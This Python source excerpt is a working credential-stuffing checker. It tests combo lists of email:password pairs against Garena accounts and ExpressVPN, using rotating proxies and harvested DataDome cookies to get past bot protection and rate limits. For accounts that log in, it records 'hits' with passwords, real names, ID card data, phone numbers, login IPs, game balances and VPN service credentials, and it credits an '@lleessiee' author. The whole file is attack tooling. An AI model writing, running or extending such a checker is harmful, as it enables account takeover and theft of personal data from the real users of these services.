                'suspicious': details['security'].get('suspicious', False),
                'password_strength': details['security'].get('password_strength', 'N/A'),
                'email_verified_time': details.get('email_verified_time', 'N/A'),
                'whitelistable': details['status'].get('whitelistable', False),
                'realinfo_updatable': details['status'].get('realinfo_updatable', False),
                'account_created': details['status'].get('account_created', 'N/A')
            }

            has_codm = False
            codm_info = {}
            try:
                codm_session = requests.Session()
                for cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                    if cookie_name in session.cookies:
                        codm_session.cookies.set(cookie_name, session.cookies.get(cookie_name), domain='.garena.com')
                has_codm, codm_info = check_codm_account(codm_session, account)
                codm_session.close()
                if has_codm and codm_info:
                    account_data['has_codm'] = True
                    account_data['codm_level'] = int(codm_info.get('codm_level', 0))
                    account_data['codm_region'] = codm_info.get('region', 'N/A')
                    account_data['codm_nickname'] = codm_info.get('codm_nickname', 'N/A')
                    account_data['codm_uid'] = codm_info.get('uid', 'N/A')
                    account_data['region_code'] = codm_info.get('region_code', 'N/A')
                else:
                    account_data['has_codm'] = False
                    account_data['codm_level'] = 0
                    account_data['codm_region'] = 'N/A'
                    account_data['codm_nickname'] = 'N/A'
                    account_data['codm_uid'] = 'N/A'
                    account_data['region_code'] = 'N/A'
            except Exception:
                account_data['has_codm'] = False
                account_data['codm_level'] = 0
                account_data['codm_region'] = 'N/A'
                account_data['codm_nickname'] = 'N/A'
                account_data['codm_uid'] = 'N/A'
                account_data['region_code'] = 'N/A'

            game_connections = []
            if CHECK_OTHER_GAMES:
                try:
                    game_connections = get_game_connections(session, account)
                except Exception:
                    pass
            account_data['game_connections'] = game_connections

            fresh_datadome = datadome_manager.extract_datadome_from_session(session)
            if fresh_datadome:
                cookie_manager.save_cookie(fresh_datadome)

            results_manager.add_account(account_data)
            codm_level = account_data.get('codm_level', 0)
            live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=account_data['has_codm'], is_error=False)
            live_stats.update_highest(details['profile'].get('shell_balance', 0), codm_level, details['is_clean'])
            if account_data['has_codm']:
                live_stats.add_codm_details(codm_level, details['personal'].get('country', 'N/A'))
            live_stats.push_result(success=True, is_clean=details['is_clean'], has_codm=account_data['has_codm'], codm_level=codm_level)

            if CHECK_OTHER_GAMES and game_connections:
                save_game_folder(account, password, account_data, game_connections, results_manager.base_dir)

            is_clean = account_data['is_clean']
            has_codm = account_data['has_codm']
            shell = account_data['shell_balance']
            username = account_data['username']
            region = account_data['codm_region']
            nickname = account_data['codm_nickname']
            uid = account_data['codm_uid']
            mobile = account_data['formatted_mobile']
            email_display = account_data['email_display']
            email_ver = "yes" if account_data['email_verified'] else "no"
            two_step = "Yes" if account_data['two_step_verify'] else "No"
            auth_app = "Yes" if account_data['authenticator_app'] else "No"
            country = account_data['country']
            last_login = account_data['last_login_date']
            last_login_ip = account_data['last_login_ip']
            connected_games = account_data['game_connections']
            game_list = []
            for g in connected_games:
                if isinstance(g, dict):
                    game_name = g.get('game', '')
                    if game_name:
                        game_list.append(game_name)
                elif isinstance(g, str):
                    game_list.append(g)

            real_name = account_data.get('real_name', 'N/A')
            id_card = account_data.get('id_card', 'N/A')
            signature = account_data.get('signature', 'N/A')
            avatar = account_data.get('avatar', 'N/A')
            suspicious = "TRUE" if account_data.get('suspicious', False) else "FALSE"
            password_strength = account_data.get('password_strength', 'N/A')
            email_verified_time = account_data.get('email_verified_time', 'N/A')
            id_card_length = account_data.get('id_card_length', 'N/A')
            whitelistable = "TRUE" if account_data.get('whitelistable', False) else "FALSE"
            realinfo_updatable = "TRUE" if account_data.get('realinfo_updatable', False) else "FALSE"
            account_created = account_data.get('account_created', 'N/A')

            formatted_hit = format_hit(
                username=username,
                password=password,
                shell=shell,
                level=codm_level,
                region=region,
                nickname=nickname,
                uid=uid,
                mobile=mobile,
                email=email_display,
                email_ver=email_ver,
                two_step=two_step,
                auth_app=auth_app,
                country=country,
                last_login=last_login,
                is_clean=is_clean,
                fb_link=fb_link,
                fb_info=fb_info,
                last_login_ip=last_login_ip,
                has_codm=has_codm,
                connected_games=game_list,
                colorized=True,
                avatar=avatar,
                suspicious=suspicious,
                real_name=real_name,
                id_card=id_card,
                signature=signature,
                password_strength=password_strength,
                email_verified_time=email_verified_time,
                id_card_length=id_card_length,
                whitelistable=whitelistable,
                realinfo_updatable=realinfo_updatable,
                account_created=account_created
            )

            save_clean_or_notclean(
                is_clean=is_clean,
                shell=shell,
                result_folder=results_manager.base_dir,
                formatted_text=formatted_hit,
                codm_info={'codm_level': codm_level, 'codm_nickname': nickname, 'region': region, 'uid': uid},
                account=account,
                password=password,
                country=country,
                live_stats=live_stats
            )

            display_info(account, password, details, codm_info, has_codm, gc=game_connections)

            if auto_remove:
                file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')

            return formatted_hit

        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            if attempt < max_retries:
                time.sleep(random.uniform(0, retry_delay))
                continue
            else:
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Connection/Timeout Error'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return fit_line(account, "ᴡʀᴏɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs")

        except Exception:
            if attempt < max_retries:
                time.sleep(random.uniform(0, retry_delay))
                continue
            else:
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Unexpected Error'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return fit_line(account, "ᴡʀᴏɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs")

    live_stats.update_stats(is_error=True)
    return fit_line(account, "ᴡʀᴏɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs")

def _prelogin_no_ip_wait(session, account, datadome_manager, max_retries=3):
    url = 'https://sso.garena.com/api/prelogin'
    for attempt in range(max_retries):
        try:
            params = {'app_id': '10100', 'account': account, 'format': 'json', 'id': str(int(time.time() * 1000))}
            current_cookies = session.cookies.get_dict()
            cookie_parts = [f'{n}={current_cookies[n]}' for n in ('apple_state_key', 'datadome', 'sso_key') if n in current_cookies]
            headers = {
                'accept': 'application/json, text/plain, */*', 'accept-encoding': 'gzip, deflate, br, zstd', 'accept-language': 'en-US,en;q=0.9', 'connection': 'keep-alive', 'host': 'sso.garena.com', 'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}', 'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            if cookie_parts:
                headers['cookie'] = '; '.join(cookie_parts)
            resp = session.get(url, headers=headers, params=params, timeout=10)
            new_dd = resp.cookies.get('datadome')
            if new_dd:
                session.cookies.set('datadome', new_dd, domain='.garena.com')
                datadome_manager.set_datadome(new_dd)
            if resp.status_code == 403:
                fresh = get_datadome_cookie(session)
                if fresh:
                    datadome_manager.set_datadome(fresh)
                    datadome_manager.set_session_datadome(session, fresh)
                    time.sleep(5)
                    continue
                return (None, None, None)
            resp.raise_for_status()
            data = resp.json()
            if 'error' in data:
                return (None, None, None)
            v1 = data.get('v1')
            v2 = data.get('v2')
            if not v1 or not v2:
                return (None, None, None)
            return (v1, v2, new_dd)
        except Exception:
            if attempt < max_retries - 1:
                time.sleep(2)
            continue
    return (None, None, None)

def validator_check():
    clear_screen()
    display_banner()

    file_manager = FileManager()
    selected_file = select_input_file_flow(show_auto_remove=False)
    if not selected_file:
        _log('ERROR', 'No file selected.')
        return

    w = _w(60)
    left = "  "

    def strip_ansi(t):
        return re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', t)

    def print_box_line(content):
        clean = strip_ansi(content)
        pad = (w - 4) - len(clean)
        if pad < 0:
            pad = 0
        print(f"{left}{WARM_GRAY}║{content}{' ' * pad}{WARM_GRAY}║{RESET}")

    def print_box_header(title, color=OCHRE):
        clean_title = strip_ansi(title)
        print(f"{left}{WARM_GRAY}╔{'═' * (w - 4)}╗{RESET}")
        title_pad = (w - 4) - len(clean_title)
        if title_pad < 0:
            title_pad = 0
        print(f"{left}{WARM_GRAY}║{color}{title}{RESET}{' ' * title_pad}{WARM_GRAY}║{RESET}")
        print(f"{left}{WARM_GRAY}╠{'═' * (w - 4)}╣{RESET}")

    def print_box_footer():
        print(f"{left}{WARM_GRAY}╚{'═' * (w - 4)}╝{RESET}")

    print_box_header(" REMOVE DUPLICATES ")
    print_box_line(f"{OCHRE}Remove duplicate lines from the selected file?{RESET}")
    print_box_line(f"{WARM_GRAY}Enter Y or N{RESET}")
    print_box_footer()
    print()

    dup_choice = input(f"  {WARM_GRAY}➤{OCHRE} REMOVE DUPLICATE LINES? [Y/N] : {SOFT_WHITE}").strip()
    print(RESET, end="")
    if dup_choice.lower() == 'y':
        prompt_for_duplicate_removal(selected_file)

    print_box_header(" AUTO-REMOVE CHECKED LINES ")
    print_box_line(f"{OCHRE}Automatically remove checked lines from file?{RESET}")
    print_box_line(f"{WARM_GRAY}Enter Y or N{RESET}")
    print_box_footer()
    print()

    auto_choice = input(f"  {WARM_GRAY}➤{OCHRE} AUTO-REMOVE CHECKED LINES? [Y/N] : {SOFT_WHITE}").strip()
    print(RESET, end="")
    auto_remove = (auto_choice.lower() == 'y')

    accounts = []
    try:
        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                account, password = clean_account_line(line)
                if account and password:
                    accounts.append(f'{account}:{password}')
        _log('SUCCESS', f'File loaded: [bold]{len(accounts):,}[/bold] accounts')
    except Exception as e:
        _log('ERROR', 'Could not read file.')
        return
    if not accounts:
        _log('ERROR', 'No valid accounts found in file.')
        return
    _log('INFO', f'Total accounts queued: [bold]{len(accounts):,}[/bold]')
    print()

    print_box_header(" PROXY CONFIGURATION ")
    print_box_line(f"{TERRACOTTA}VPN ONLY HAS BEEN REMOVED{RESET}")
    print_box_line(f"{DUSTY_ROSE}PROXY & VPN IS NOW MANDATORY{RESET}")
    print_box_line(f"{WARM_GRAY}Proxy and VPN support for stable connections.{RESET}")
    print_box_footer()
    print()

    if not os.path.exists("proxies.txt"):
        _log('ERROR', 'Proxies file not found! Proxy is required to continue.')
        input(f'\n  {OCHRE}Press Enter to return to menu.{RESET}')
        return

    proxy_manager = ProxyManager()
    if not proxy_manager.is_loaded():
        _log('ERROR', 'No valid proxies found in proxies.txt.')
        input(f'\n  {OCHRE}Press Enter to return to menu.{RESET}')
        return

    _log('SUCCESS', f'Loaded [bold]{len(proxy_manager.proxies)}[/bold] proxies')
    max_threads = min(25, len(proxy_manager.proxies) * 2)
    if max_threads < 1:
        max_threads = 1

    print_box_header(" THREAD CONFIGURATION ")
    thread_options = [
        (5, "5  threads  – Safe, low concurrency"),
        (10, "10 threads  – Moderate"),
        (15, "15 threads  – Fast"),
        (20, "20 threads  – Very fast (risk)"),
        (25, "25 threads  – Maximum (high risk)")
    ]
    for i, (t, desc) in enumerate(thread_options, 1):
        if t <= max_threads:
            print_box_line(f"{SAGE}ᴏᴘᴛɪᴏɴ {i}{SOFT_WHITE} - {desc}{RESET}")
    print_box_footer()
    print()

    while True:
        try:
            choice = input(f"  {DUSTY_ROSE}➤ Select option [1-5]{RESET}  {DUSTY_ROSE}➤{RESET} ").strip()
            if choice not in ('1', '2', '3', '4', '5'):
                _log('ERROR', 'Enter a number between 1 and 5.')
                continue
            idx = int(choice) - 1
            num_threads = thread_options[idx][0]
            if num_threads <= max_threads:
                break
            _log('ERROR', f'Max threads allowed: {max_threads}')
        except ValueError:
            _log('ERROR', 'Invalid input.')

    _log('SUCCESS', f'Running with [bold]{num_threads}[/bold] thread(s)')
    print()

    results_manager = Results(selected_file)
    cookie_manager = CookieManager()
    datadome_manager = DataDome()
    live_stats = Stats()
    live_stats.total_count = len(accounts)

    clear_screen()
    display_banner()

    w_summary = _w(68)
    def print_summary_line(content):
        clean = strip_ansi(content)
        pad = (w_summary - 4) - len(clean)
        if pad < 0:
            pad = 0
        print(f"  {WARM_GRAY}║{content}{' ' * pad}{WARM_GRAY}║{RESET}")

    print(f"  {WARM_GRAY}╔{'═' * (w_summary - 4)}╗{RESET}")
    title = " PRE-CHECK SUMMARY "
    clean_title = strip_ansi(title)
    title_pad = (w_summary - 4) - len(clean_title)
    if title_pad < 0:
        title_pad = 0
    print(f"  {WARM_GRAY}║{OCHRE}{title}{RESET}{' ' * title_pad}{WARM_GRAY}║{RESET}")
    print(f"  {WARM_GRAY}╠{'═' * (w_summary - 4)}╣{RESET}")

    label_width = 20
    print_summary_line(
        f"{SOFT_WHITE}{'ACCOUNTS LOADED:':<{label_width}}{RESET} {SAGE}{len(accounts):,}{RESET}"
    )
    print_summary_line(
        f"{SOFT_WHITE}{'THREADS CHOSEN:':<{label_width}}{RESET} {DUSTY_ROSE}{num_threads}{RESET}"
    )
    print_summary_line(
        f"{SOFT_WHITE}{'VALID COOKIES:':<{label_width}}{RESET} {OCHRE}{len(cookie_manager.get_valid_cookies())}{RESET}"
    )
    print_summary_line(
        f"{SOFT_WHITE}{'PROXIES:':<{label_width}}{RESET} {SAGE}{len(proxy_manager.proxies)}{RESET}"
    )
    print_summary_line(
        f"{SOFT_WHITE}{'AUTO-REMOVE:':<{label_width}}{RESET} {SAGE if auto_remove else TERRACOTTA}{'ENABLED' if auto_remove else 'DISABLED'}{RESET}"
    )

    print(f"  {WARM_GRAY}╚{'═' * (w_summary - 4)}╝{RESET}\n")

    overall_done = 0
    account_index_counter = [0]
    index_lock = threading.Lock()
    stats_lock = threading.Lock()
    global _suppress_ip_prints, _ip_block_callback
    _suppress_ip_prints = True
    def _ip_block_cb(blocked: bool):
        pass
    _ip_block_callback = _ip_block_cb
    _thread_local = threading.local()
    print("\n" * GARENA_UI_HEIGHT)

    def _get_thread_resources():
        if not hasattr(_thread_local, 'session') or not hasattr(_thread_local, 'datadome'):
            _thread_local.session = requests.Session()
            _thread_local.datadome = DataDome()
            if proxy_manager and proxy_manager.is_loaded():
                _thread_local.session.proxies.update(proxy_manager.get_next())
            proxy_dict = dict(_thread_local.session.proxies) if proxy_manager and proxy_manager.is_loaded() else None
            valid_cookies = cookie_manager.get_valid_cookies()
            if valid_cookies:
                combined = '; '.join(valid_cookies)
                applyck(_thread_local.session, combined)
                dd_line = valid_cookies[-1]
                if 'datadome=' in dd_line:
                    for part in dd_line.split(';'):
                        part = part.strip()
                        if part.startswith('datadome='):
                            _thread_local.datadome.set_datadome(part.split('=', 1)[1].strip())
                            break
            else:
                dd = get_datadome_cookie(_thread_local.session, proxies=proxy_dict)
                if dd:
                    _thread_local.datadome.set_datadome(dd)
        return (_thread_local.session, _thread_local.datadome)

    def _worker(account_line):
        if ':' not in account_line:
            return
        try:
            account, password = account_line.split(':', 1)
            account = account.strip()
            password = password.strip()
            session, datadome_mgr = _get_thread_resources()

            if num_threads <= 5:
                retries = 3
                retry_delay = 0.5
            elif num_threads <= 10:
                retries = 2
                retry_delay = 0.3
            else:
                retries = 1
                retry_delay = 0.0

            with stats_lock:
                nonlocal overall_done
                overall_done += 1
                stats = live_stats.get_stats()
                stats_text = build_live_stats_ui(stats, 75)
                stats_lines = stats_text.count('\n') + 1
                sys.stdout.write(f"\033[{stats_lines}A\033[J")
                sys.stdout.flush()
                print(stats_text)

            result = processaccount(
                session, account, password, cookie_manager, datadome_mgr,
                live_stats, results_manager, file_manager, selected_file,
                auto_remove, suppress_print=True, proxy_manager=proxy_manager,
                max_retries=retries, retry_delay=retry_delay,
                validator_mode=True
            )

            with stats_lock:
                stats = live_stats.get_stats()
                stats_text = build_live_stats_ui(stats, 75)
                stats_lines = stats_text.count('\n') + 1
                sys.stdout.write(f"\033[{stats_lines}A\033[J")
                sys.stdout.flush()

                if "ᴠᴀʟɪᴅ" in result:
                    print(f"{SAGE}✔  {SOFT_WHITE}{account}{RESET}  →  {SAGE}VALID{RESET}")
                elif "ᴅᴏᴇsɴ'ᴛ ᴇxɪsᴛ" in result:
                    print(f"{TERRACOTTA}✖  {SOFT_WHITE}{account}{RESET}  →  {TERRACOTTA}DOESN'T EXIST{RESET}")
                else:
                    print(f"{TERRACOTTA}✖  {SOFT_WHITE}{account}{RESET}  →  {TERRACOTTA}INVALID{RESET}")

                print(f"   {DUSTY_ROSE}───────────────────────────────────────────────────────{RESET}")
                print(stats_text)

            if proxy_manager and proxy_manager.is_loaded():
                proxy_manager.get_next()

        except Exception as e:
            with stats_lock:
                stats = live_stats.get_stats()
                stats_text = build_live_stats_ui(stats, 75)
                stats_lines = stats_text.count('\n') + 1
                sys.stdout.write(f"\033[{stats_lines}A\033[J")
                sys.stdout.flush()
                print(f"{TERRACOTTA}✖  {SOFT_WHITE}{account_line.split(':', 1)[0]}{RESET}  →  {TERRACOTTA}ERROR{RESET}")
                print(f"   {DUSTY_ROSE}───────────────────────────────────────────────────────{RESET}")
                print(stats_text)

    def _wrapped_worker(account_line):
        with index_lock:
            account_index_counter[0] += 1
        _worker(account_line)

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {executor.submit(_wrapped_worker, ln): ln for ln in accounts}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass

    sys.stdout.write(f"\033[{GARENA_UI_HEIGHT}A\033[J")
    sys.stdout.flush()
    _suppress_ip_prints = False
    _ip_block_callback = None
    print()

    stats = live_stats.get_stats()
    display_summary(
        stats.get('checked', 0),
        stats.get('invalid', 0),
        stats.get('valid', 0),
        live_stats.categorized_levels,
        live_stats.countries,
        len(accounts),
        live_stats.highest_clean,
        live_stats.highest_not_clean,
        live_stats.highest_shells
    )
    results_manager.db_flush_final()
    _flush_auto_remove(file_manager, selected_file, force=True)
    print(f'  {WARM_GRAY}Results saved in real-time to Results/{RESET}')
    print()
    input(f'  {OCHRE}Press Enter to return to menu.{RESET}')

def expressvpn_check():
    clear_screen()
    display_banner()

    file_manager = FileManager()
    combo_files = file_manager.scan_combo_folder()
    if not combo_files:
        _log('ERROR', 'No .txt files in Combo folder.')
        input(f'  {OCHRE}Press Enter to return.{RESET}')
        return

    selected_file = select_input_file_flow(show_auto_remove=False)
    if not selected_file:
        _log('ERROR', 'No file selected.')
        return

    dup_choice = input(f"  {WARM_GRAY}➤{OCHRE} Remove duplicate lines? [Y/N] : {SOFT_WHITE}").strip()
    print(RESET, end="")
    if dup_choice.lower() == 'y':
        prompt_for_duplicate_removal(selected_file)

    accounts = []
    for encoding in ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']:
        try:
            with open(selected_file, 'r', encoding=encoding) as f:
                accounts = [line.strip() for line in f if line.strip() and not line.startswith('===')]
            break
        except:
            continue

    if not accounts:
        _log('ERROR', 'No valid accounts found.')
        input(f'  {OCHRE}Press Enter to return.{RESET}')
        return

    _log('INFO', 'Loading proxy configuration...')
    proxy_manager = None
    if os.path.exists("proxies.txt"):
        proxy_manager = ProxyManager()
        if proxy_manager.is_loaded():
            _log('SUCCESS', f'Loaded {len(proxy_manager.proxies)} proxies')
        else:
            _log('WARNING', 'proxies.txt found but no valid proxies. Running direct.')
            proxy_manager = None
    else:
        _log('INFO', 'No proxies.txt found – using direct connection (no proxies).')

    w_warn = _w(60)
    def _warn_line(content):
        clean = re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', content)
        pad = (w_warn - 4) - len(clean)
        if pad < 0:
            pad = 0
        print(f"  {OCHRE}║{content}{' ' * pad}{OCHRE}║{RESET}")

    print(f"  {OCHRE}╔{'═' * (w_warn - 4)}╗{RESET}")
    _warn_line(f"{TERRACOTTA}⚠  EXPRESSVPN RATE LIMIT ADVISORY  ⚠{RESET}")
    _warn_line(f"{WARM_GRAY}ExpressVPN API limit each IP to 200 per 15 minutes.{RESET}")
    _warn_line(f"{WARM_GRAY}Tool will rotate proxies each to distribute load.{RESET}")
    _warn_line(f"{WARM_GRAY}If you see many HTTP errors, your proxy are blocked.{RESET}")
    _warn_line(f"{WARM_GRAY}For large files, use {SAGE}proxy{RESET}{WARM_GRAY} with many address.{RESET}")
    print(f"  {OCHRE}╚{'═' * (w_warn - 4)}╝{RESET}")
    print()

    if input(f"  {OCHRE}Continue? (y/n){RESET}  {OCHRE}➤{RESET} ").strip().lower() != 'y':
        _log('INFO', 'Returning to menu.')
        return

    def _strip_ansi(text):
        return re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', text)

    def _build_express_live_stats(stats, width=70):
        checked = stats.get('checked', 0)
        total = stats.get('total', 0)
        premium = stats.get('premium', 0)
        free = stats.get('free', 0)
        invalid = stats.get('invalid', 0)
        elapsed = stats.get('elapsed', 0)
        if total == 0:
            progress = 0
        else:
            progress = (checked / total) * 100
        bar_len = 40
        filled = int(bar_len * progress / 100)
        bar = '█' * filled + '░' * (bar_len - filled)

        hue = (1 - (progress / 100)) * 0.6
        r = int(220 + 30 * (1 - hue))
        g = int(180 + 50 * hue)
        b = int(140 + 40 * (1 - hue))
        bar_color = f'\033[38;2;{r};{g};{b}m'

        lines = []
        lines.append(f"  {WARM_GRAY}◈  EXPRESSVPN LIVE STATS  ◈{RESET}")
        lines.append(f"  {bar_color}{bar}{RESET}  {OCHRE}{progress:.1f}%{RESET}  {DUSTY_ROSE}{checked}/{total}{RESET}")
        lines.append(f"  {SAGE}PREMIUM{RESET}: {SOFT_WHITE}{premium}{RESET}  {DUSTY_ROSE}FREE{RESET}: {SOFT_WHITE}{free}{RESET}  {TERRACOTTA}INVALID{RESET}: {SOFT_WHITE}{invalid}{RESET}")
        rate = checked / elapsed if elapsed > 0 else 0
        if rate > 0:
            eta = (total - checked) / rate
            lines.append(f"  {WARM_GRAY}⚡ {rate:.1f}/s  ·  ETA {int(eta//60)}m {int(eta%60)}s{RESET}")
        return "\n".join(lines)

    class AesCryptographyService:
        def decrypt(self, data, key, iv):
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(data)
            padding_length = decrypted[-1]
            return decrypted[:-padding_length]

    def get_byte_array(size):
        return get_random_bytes(size)

    def envelope_encrypt(input_data, certificate_bytes):
        from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKey
        from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
        from cryptography.hazmat.primitives import serialization, hashes
        from cryptography.hazmat.backends import default_backend
        from cryptography import x509
        import os
        from asn1crypto import cms, x509 as asn1_x509, keys
        from Crypto.PublicKey import RSA

        cert = x509.load_der_x509_certificate(certificate_bytes, default_backend())
        public_key = cert.public_key()
        if not isinstance(public_key, RSAPublicKey):
            raise ValueError("Not an RSA key")

        content_key = os.urandom(24)
        content_iv = os.urandom(8)

        pad_length = 8 - (len(input_data) % 8) if len(input_data) % 8 != 0 else 8
        padded_data = input_data + bytes([pad_length] * pad_length)

        from Crypto.Cipher import DES3
        cipher = DES3.new(content_key, DES3.MODE_CBC, content_iv)
        encrypted_content = cipher.encrypt(padded_data)

        encrypted_key = public_key.encrypt(content_key, PKCS1v15())

        cert_der = certificate_bytes
        asn1_cert = asn1_x509.Certificate.load(cert_der)
        issuer = asn1_cert.issuer
        serial_number = asn1_cert.serial_number

        recipient_id = cms.IssuerAndSerialNumber({
            'issuer': issuer,
            'serial_number': serial_number
        })
        key_trans_recipient = cms.KeyTransRecipientInfo({
            'version': 0,
            'rid': cms.RecipientIdentifier(name='issuer_and_serial_number', value=recipient_id),
            'key_encryption_algorithm': cms.KeyEncryptionAlgorithm({
                'algorithm': '1.2.840.113549.1.1.1'
            }),
            'encrypted_key': cms.OctetString(encrypted_key)
        })
        recipient_infos = cms.RecipientInfos([
            cms.RecipientInfo(name='ktri', value=key_trans_recipient)
        ])
        encrypted_content_info = cms.EncryptedContentInfo({
            'content_type': '1.2.840.113549.1.7.1',
            'content_encryption_algorithm': cms.EncryptionAlgorithm({
                'algorithm': '1.2.840.113549.3.7',
                'parameters': cms.OctetString(content_iv)
            }),
            'encrypted_content': cms.OctetString(encrypted_content)
        })
        enveloped_data = cms.EnvelopedData({
            'version': 0,
            'recipient_infos': recipient_infos,
            'encrypted_content_info': encrypted_content_info
        })
        content_info = cms.ContentInfo({
            'content_type': '1.2.840.113549.1.7.3',
            'content': enveloped_data
        })
        return content_info.dump()

    def gzip_data(input_string):
        input_bytes = input_string.encode('ascii')
        output_stream = BytesIO()
        with gzip.GzipFile(fileobj=output_stream, mode='wb') as gz:
            gz.write(input_bytes)
        return output_stream.getvalue()

    def compute_signature(input_data, key):
        signature = hmac.new(key, input_data, hashlib.sha1).digest()
        return base64.b64encode(signature).decode('ascii')

    def generate_random_string(length=64):
        return ''.join(random.choices(string.hexdigits.lower(), k=length))

    def unix_time_to_date(unix_time):
        return datetime.fromtimestamp(int(unix_time)).strftime('%Y-%m-%d')

    def format_valid_hit(account_data, is_premium):
        lines = []
        lines.append("")
        lines.append(f"{DUSTY_ROSE}◆{'─' * 58}◆{RESET}")
        lines.append(f"  {SOFT_WHITE}✦  EXPRESSVPN  {'PREMIUM' if is_premium else 'FREE'}  ✦{RESET}")
        lines.append(f"{DUSTY_ROSE}◆{'─' * 58}◆{RESET}")
        lines.append(f"  {WARM_GRAY}Email{RESET}: {SOFT_WHITE}{account_data.get('email', 'N/A')}{RESET}")
        lines.append(f"  {WARM_GRAY}Password{RESET}: {SOFT_WHITE}{account_data.get('password', 'N/A')}{RESET}")
        lines.append(f"  {WARM_GRAY}Plan{RESET}: {SAGE if is_premium else CLAY}{'PREMIUM' if is_premium else 'FREE'}{RESET}")
        lines.append(f"  {WARM_GRAY}License Status{RESET}: {SOFT_WHITE}{account_data.get('license_status', 'N/A')}{RESET}")
        if account_data.get('plan_name') and account_data['plan_name'] not in ('Not Provided', 'N/A'):
            lines.append(f"  {WARM_GRAY}Plan Name{RESET}: {SOFT_WHITE}{account_data['plan_name']}{RESET}")
        if account_data.get('billing_cycle'):
            lines.append(f"  {WARM_GRAY}Billing Cycle{RESET}: {SOFT_WHITE}{account_data['billing_cycle']} months{RESET}")
        if account_data.get('expire_date') and account_data['expire_date'] not in ('Not Provided', 'N/A'):
            lines.append(f"  {WARM_GRAY}Expiry Date{RESET}: {SOFT_WHITE}{account_data['expire_date']}{RESET}")
        if account_data.get('days_left') and account_data['days_left'] not in ('Not Provided', 'N/A'):
            lines.append(f"  {WARM_GRAY}Days Left{RESET}: {SOFT_WHITE}{account_data['days_left']}{RESET}")
        if account_data.get('auto_renew') and account_data['auto_renew'] not in ('Not Provided', 'N/A'):
            lines.append(f"  {WARM_GRAY}Auto Renew{RESET}: {SOFT_WHITE}{account_data['auto_renew']}{RESET}")
        if account_data.get('payment_method') and account_data['payment_method'] not in ('Not Provided', 'N/A'):
            lines.append(f"  {WARM_GRAY}Payment Method{RESET}: {SOFT_WHITE}{account_data['payment_method']}{RESET}")
        if account_data.get('currency') and account_data['currency'] not in ('Not Provided', 'N/A'):
            lines.append(f"  {WARM_GRAY}Currency{RESET}: {SOFT_WHITE}{account_data['currency']}{RESET}")
        if account_data.get('country') and account_data['country'] not in ('Not Provided', 'N/A'):
            lines.append(f"  {WARM_GRAY}Country{RESET}: {SOFT_WHITE}{account_data['country']}{RESET}")
        if account_data.get('subscription_created') and account_data['subscription_created'] not in ('Not Provided', 'N/A'):
            lines.append(f"  {WARM_GRAY}Subscription Cre{RESET}: {SOFT_WHITE}{account_data['subscription_created']}{RESET}")
        if account_data.get('trial_ends') and account_data['trial_ends'] not in ('Not Provided', 'N/A'):
            lines.append(f"  {WARM_GRAY}Trial Ends{RESET}: {SOFT_WHITE}{account_data['trial_ends']}{RESET}")
        lines.append(f"{DUSTY_ROSE}◆{'─' * 58}◆{RESET}")
        lines.append(f"  {WARM_GRAY}OpenVPN Credentials{RESET}")
        lines.append(f"    {WARM_GRAY}Username{RESET}: {SOFT_WHITE}{account_data.get('ovpn_username', 'N/A')}{RESET}")
        lines.append(f"    {WARM_GRAY}Password{RESET}: {SOFT_WHITE}{account_data.get('ovpn_password', 'N/A')}{RESET}")
        lines.append(f"  {WARM_GRAY}PPTP Credentials{RESET}")
        lines.append(f"    {WARM_GRAY}Username{RESET}: {SOFT_WHITE}{account_data.get('pptp_username', 'N/A')}{RESET}")
        lines.append(f"    {WARM_GRAY}Password{RESET}: {SOFT_WHITE}{account_data.get('pptp_password', 'N/A')}{RESET}")
        if account_data.get('last_login') and account_data['last_login'] not in ('Not Provided', 'N/A'):
            lines.append(f"  {WARM_GRAY}Last Login{RESET}: {SOFT_WHITE}{account_data['last_login']}{RESET}")
        if account_data.get('account_created') and account_data['account_created'] not in ('Not Provided', 'N/A'):
            lines.append(f"  {WARM_GRAY}Account Created{RESET}: {SOFT_WHITE}{account_data['account_created']}{RESET}")
        lines.append(f"{DUSTY_ROSE}◆{'─' * 58}◆{RESET}")
        lines.append(f"  {DIM}Powered by @lleessiee{RESET}")
        lines.append(f"{DUSTY_ROSE}◆{'─' * 58}◆{RESET}")
        return "\n".join(lines)

    def format_invalid_hit(email, password, error):
        combo = f"{email}:{password}"
        if len(combo) > 60:
            combo = combo[:57] + "…"
        lines = []
        lines.append("")
        lines.append(f"{TERRACOTTA}◆{'─' * 58}◆{RESET}")
        lines.append(f"  {TERRACOTTA}✖  INVALID{RESET}")
        lines.append(f"{TERRACOTTA}◆{'─' * 58}◆{RESET}")
